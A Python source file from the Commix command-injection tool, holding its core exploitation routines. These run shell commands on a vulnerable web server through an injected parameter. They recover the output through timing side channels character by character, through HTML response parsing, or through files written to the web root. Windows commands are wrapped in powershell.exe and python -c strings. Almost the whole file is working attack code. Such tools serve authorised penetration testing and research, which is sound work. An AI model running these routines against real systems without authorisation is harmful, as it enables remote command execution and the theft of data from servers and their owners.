#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import json
import string
import random
from src.utils import menu
from src.utils import settings
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.utils import common
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import html_parser as _html_parser
from src.thirdparty.colorama import Fore, Back, Style, init

"""
The main time-realative command injection exploitation.
"""
def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):

  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads

  if settings.TARGET_OS == settings.OS.WINDOWS:
    previous_cmd = cmd
    if alter_shell:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
      else:
        cmd = checks.quoted_cmd(cmd)
    else:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
      else:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"

  if menu.options.file_write or menu.options.file_upload:
    minlen = 0
  else:
    minlen = 1

  found_chars = False
  info_msg = "Retrieving the length of execution output"
  if settings.TEMPFILE_BASED_STATE:
    info_msg += " (via '" + OUTPUT_TEXTFILE +"')"
  info_msg += "."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  for output_length in range(int(minlen), int(maxlen)):
    if alter_shell:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
      else:
        payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
    else:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
      else:
        payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)

    exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    injection_check = False
    if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
      injection_check = True

    if injection_check == True:
      if output_length > 1:
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Retrieved the length of execution output: " + str(output_length)
          settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
        else:
          sub_content = "Retrieved: " + str(output_length)
          settings.print_data_to_stdout(settings.print_sub_content(sub_content))
      found_chars = True
      injection_check = False
      break

  # Proceed with the next (injection) step!
  if found_chars == True :
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    percent = "0.0%"
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      info_msg = "Presuming the execution output."
    else:
      info_msg = "Retrieving the execution output (via '" + OUTPUT_TEXTFILE + "')."
    if settings.VERBOSITY_LEVEL == 0 :
      info_msg += ".. (" + str(percent) + ")"
    else:
      info_msg +=  "\n"
    if output_length > 1:
      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
      
    for num_of_chars in range(1, int(num_of_chars)):
      char_pool = checks.generate_char_pool(num_of_chars)
      for ascii_char in char_pool:
        if alter_shell:
          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
            payload = payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
          else:
            payload = payloads.get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
            payload = payloads.get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
          else:
            payload = payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
        exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
        injection_check = False
        if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
          injection_check = True

        if injection_check == True:
          if settings.VERBOSITY_LEVEL == 0:
            output.append(chr(ascii_char))
            percent, float_percent = checks.percentage_calculation(num_of_chars, output_length)
            if percent == 100:
              float_percent = settings.info_msg
            else:
              float_percent = ".. (" + str(float_percent) + "%)"
            if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
              info_msg = "Presuming the execution output."
            else:
              info_msg = "Retrieving the execution output (via '" + OUTPUT_TEXTFILE + "')."
            info_msg += float_percent
            settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
          else:
            output.append(chr(ascii_char))
          injection_check = False
          break

    check_end  = time.time()
    check_exec_time = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    # Check for empty output.
    if output == (len(output) * settings.SINGLE_WHITESPACE):
      output = ""

  else:
    check_start = 0
    check_exec_time = 0
    output = ""

  return check_exec_time, output

"""
The main results-based command injection exploitation.
"""
def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique):

  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique):
    if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      from src.core.injections.results_based.techniques.classic import cb_payloads as payloads
    elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
      from src.core.injections.results_based.techniques.eval_based import eb_payloads as payloads
    else:
      from src.core.injections.semiblind.techniques.file_based import fb_payloads as payloads

    if alter_shell:
      if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload = payloads.cmd_execution_alter_shell(separator, TAG, cmd)
      else:
        payload = payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE)
    else:
      if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload = payloads.cmd_execution(separator, TAG, cmd)
      else:
        payload = payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE)
    if settings.VERBOSITY_LEVEL != 0:
      _ = cmd
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
        payload_msg = payload.replace("\n", "\\n")
        if settings.COMMENT in payload_msg:
          payload = payload.split(settings.COMMENT)[0].strip()
          payload_msg = payload_msg.split(settings.COMMENT)[0].strip()
        if settings.COMMENT in cmd:  
          _ = cmd.split(settings.COMMENT)[0].strip()
      debug_msg = "Executing the '" + _ + "' command. "
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    return response

  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
  
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    tries = 0
    while not response:
      if tries < (menu.options.failed_tries / 2):
        response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        tries = tries + 1
      else:
        err_msg = "Something went wrong, the request has failed (" + str(tries) + ") times continuously."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()

  return response


"""
False-positive check and evaluation.
"""
def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique):

  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
  
  if settings.TARGET_OS == settings.OS.WINDOWS:
    previous_cmd = cmd
    if alter_shell:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
      else:
        cmd = checks.quoted_cmd(cmd)
    else:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
      else:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"

  found_chars = False
  checks.check_for_false_positive_result(false_positive_warning)

  # Varying the sleep time.
  if false_positive_warning:
    timesec = timesec + random.randint(3, 5)

  # Checking the output length of the used payload.
  if settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(".")
  for output_length in range(1, 3):
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(".")
    # Execute shell commands on vulnerable host.
    if alter_shell :
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
      else:  
        payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
    else:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
      else:  
        payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)

    exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    if (exec_time >= settings.FOUND_EXEC_TIME) and (exec_time - timesec >= settings.FOUND_DIFF):
      found_chars = True
      break

  if found_chars == True :
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()

    output = []
    percent = 0
    
    is_valid = False
    for num_of_chars in range(1, int(num_of_chars)):
      for ascii_char in range(1, 20):
        if settings.VERBOSITY_LEVEL == 0:
          settings.print_data_to_stdout(".")
        if alter_shell:
          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
            payload = payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
          else:
            payload = payloads.fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
            payload = payloads.fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
          else:  
            payload = payloads.fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method)
        exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
        if (exec_time >= settings.FOUND_EXEC_TIME) and (exec_time - timesec >= settings.FOUND_DIFF):
          output.append(ascii_char)
          is_valid = True
          break

      if is_valid:
          break

    check_end  = time.time()
    check_exec_time = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      if settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")
      return exec_time, output

  else:
    checks.unexploitable_point()

"""
Prompt the user to confirm or set a custom filename for command execution output.
Returns the chosen filename.
"""
def select_output_filename(technique, tmp_path, TAG):
  # Ensure tmp_path ends with a slash for safe concatenation
  if tmp_path and not tmp_path.endswith("/"):
    tmp_path += "/"

  # If a custom filename is already set, handle tmp_path prefix depending on technique
  if settings.CUSTOM_FILENAME:
    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      if not settings.CUSTOM_FILENAME.startswith(tmp_path):
        settings.CUSTOM_FILENAME = tmp_path + settings.CUSTOM_FILENAME
    else:
      # Remove tmp_path prefix if present but technique is different
      if settings.CUSTOM_FILENAME.startswith(tmp_path):
        settings.CUSTOM_FILENAME = settings.CUSTOM_FILENAME[len(tmp_path):]
    return settings.CUSTOM_FILENAME

  # Generate default filename
  OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT

  while True:
    message = "Do you want to use a random file '" + OUTPUT_TEXTFILE 
    message += "' to receive the command execution output? [Y/n] > "
    procced_option = common.read_input(message, default="Y", check_batch=True)

    if procced_option in settings.CHOICE_YES:
      break

    elif procced_option in settings.CHOICE_NO:
      message = "Enter a filename to receive the command execution output > "
      message = common.read_input(message, default=OUTPUT_TEXTFILE, check_batch=True)

      OUTPUT_TEXTFILE = message
      info_msg = "Using '" + OUTPUT_TEXTFILE + "' for command execution output."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      break

    elif procced_option in settings.CHOICE_QUIT:
      raise SystemExit()

    else:
      common.invalid_option(procced_option)

  # Prepend tmp_path if needed
  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    OUTPUT_TEXTFILE = tmp_path + OUTPUT_TEXTFILE

  settings.CUSTOM_FILENAME = OUTPUT_TEXTFILE
  return OUTPUT_TEXTFILE

"""
Find the URL directory.
"""
def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):

  def custom_web_root(url, OUTPUT_TEXTFILE):
    path = _urllib.parse.urlparse(url).path
    if path.endswith('/'):
      # Contract again the url.
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
    else:
      try:
        path_parts = [non_empty for non_empty in path.split('/') if non_empty]
        count = 0
        for part in path_parts:
          count = count + 1
        count = count - 1
        last_param = path_parts[count]
        output = url.replace(last_param, OUTPUT_TEXTFILE)
        if "?" and settings.OUTPUT_FILE_EXT in output:
          try:
            output = output.split("?")[0]
          except:
            pass
      except IndexError:
        output = url + "/" + OUTPUT_TEXTFILE
    settings.DEFINED_WEBROOT = output
    return output

  if not settings.DEFINED_WEBROOT or settings.MULTI_TARGETS or not settings.RECHECK_FILE_FOR_EXTRACTION:
    if menu.options.web_root:
      scheme = _urllib.parse.urlparse(url).scheme
      hostname = _urllib.parse.urlparse(url).hostname
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + "/" + OUTPUT_TEXTFILE
      if not settings.DEFINED_WEBROOT or (settings.MULTI_TARGETS and not settings.RECHECK_FILE_FOR_EXTRACTION):
        if settings.MULTI_TARGETS:
          settings.RECHECK_FILE_FOR_EXTRACTION = True
        while True:
          message =  "Do you want to use the URL '" + output
          message += "' to receive the command execution output? [Y/n] > "
          procced_option = common.read_input(message, default="Y", check_batch=True)
          if procced_option in settings.CHOICE_YES:
            settings.DEFINED_WEBROOT = output
            break
          elif procced_option in settings.CHOICE_NO:
            message =  "Enter URL to receive "
            message += "the command execution output > "
            message = common.read_input(message, default=output, check_batch=True)
            if not re.search(r'^(?:http)s?://', message, re.I):
              common.invalid_option(message)
              pass
            else:
              output = settings.DEFINED_WEBROOT = message
              info_msg = "Using '" + output
              info_msg += "' for command execution output."
              settings.print_data_to_stdout(settings.print_info_msg(info_msg))
              settings.RECHECK_FILE_FOR_EXTRACTION = True
              if not settings.DEFINED_WEBROOT:
                pass
              else:
                break
          elif procced_option in settings.CHOICE_QUIT:
            raise SystemExit()
          else:
            common.invalid_option(procced_option)
            pass
    else:
        output = custom_web_root(url, OUTPUT_TEXTFILE)
  else:
    output = settings.DEFINED_WEBROOT

  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking if the file '" + output + "' is accessible."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  return output

"""
Evaluate test results.
"""
def injection_test_results(response, TAG, randvcalc, technique):
  if type(response) is bool and response != True or response is None:
    return False

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    # Check the execution results
    html_data = checks.page_encoding(response, action="decode")
    html_data = html_data.replace("\n",settings.SINGLE_WHITESPACE)
    # cleanup string / unescape html to string
    html_data = _urllib.parse.unquote(html_data)
    html_data = unescape(html_data)
    # Replace non-ASCII characters with a single space
    re.sub(r"[^\x00-\x7f]",r" ", html_data)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + TAG + TAG, html_data)
    else:
      shell = re.findall(r"" + TAG + str(randvcalc) + TAG  + TAG, html_data)
    if len(shell) > 1:
      shell = shell[0]
  else:
    html_data = checks.page_encoding(response, action="decode")
    html_data = re.sub("\n", settings.SINGLE_WHITESPACE, html_data)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)
    else:
      shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + str(randvcalc) + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)

  return shell

"""
Command execution results.
"""
def injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec):

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    false_result = False
    try:
      # Grab execution results
      html_data = checks.page_encoding(response, action="decode")
      html_data = html_data.replace("\n",settings.SINGLE_WHITESPACE)
      # cleanup string / unescape html to string
      html_data = _urllib.parse.unquote(html_data)
      html_data = unescape(html_data)
      # Replace non-ASCII characters with a single space
      re.sub(r"[^\x00-\x7f]",r" ", html_data)
      for end_line in settings.END_LINES_LIST:
        if end_line in html_data:
          html_data = html_data.replace(end_line, settings.SINGLE_WHITESPACE)
          break
      shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + settings.SINGLE_WHITESPACE, html_data)
      if not shell:
        shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
      if not shell:
        return shell
      try:
        if TAG in shell:
          shell = re.findall(r"" + "(.*)" + TAG + TAG, shell)
        # Clear junks
        shell = [tags.replace(TAG + TAG , settings.SINGLE_WHITESPACE) for tags in shell]
        shell = [backslash.replace(r"\/","/") for backslash in shell]
      except UnicodeDecodeError:
        pass
      if settings.TARGET_OS == settings.OS.WINDOWS:
        if menu.options.alter_shell:
          shell = [right_space.rstrip() for right_space in shell]
          shell = [left_space.lstrip() for left_space in shell]
          if "<<<<" in shell[0]:
            false_result = True
        else:
          if shell[0] == "%i" :
            false_result = True
    except AttributeError:
      false_result = True
    if false_result:
      shell = ""

  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
    # Grab execution results
    html_data = checks.page_encoding(response, action="decode")
    html_data = re.sub("\n", new_line, html_data)
    shell = re.findall(r"" + TAG + new_line + TAG + "(.*)" + TAG + new_line + TAG + "", html_data)
    try:
      if len(re.split(TAG  + "(.*)" + TAG, shell[0])) != 0:
        shell = re.findall(r"" + new_line + "(.*)" + new_line + "", \
                           re.split(TAG  + "(.*)" + TAG, \
                           re.split(TAG  + "(.*)" + TAG, shell[0])[0])[0])
      shell = shell[0].replace(new_line, "\n").rstrip().lstrip()
    except IndexError:
      pass

  else:
    #Find the directory.
    output = injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
    response = checks.get_response(output)
    if type(response) is bool and response != True or response is None:
      shell = ""
    else:
      try:
        shell = checks.page_encoding(response, action="encode").rstrip().lstrip()
        #shell = [newline.replace("\n",settings.SINGLE_WHITESPACE) for newline in shell]
        if settings.TARGET_OS == settings.OS.WINDOWS:
          shell = [newline.replace(settings.END_LINE.CR, "") for newline in shell]
          #shell = [space.strip() for space in shell]
          shell = [empty for empty in shell if empty]
      except (_urllib.error.HTTPError, _urllib.error.URLError) as e:
        if str(e.getcode()) == settings.NOT_FOUND_ERROR:
          shell = ""

  return shell
# eof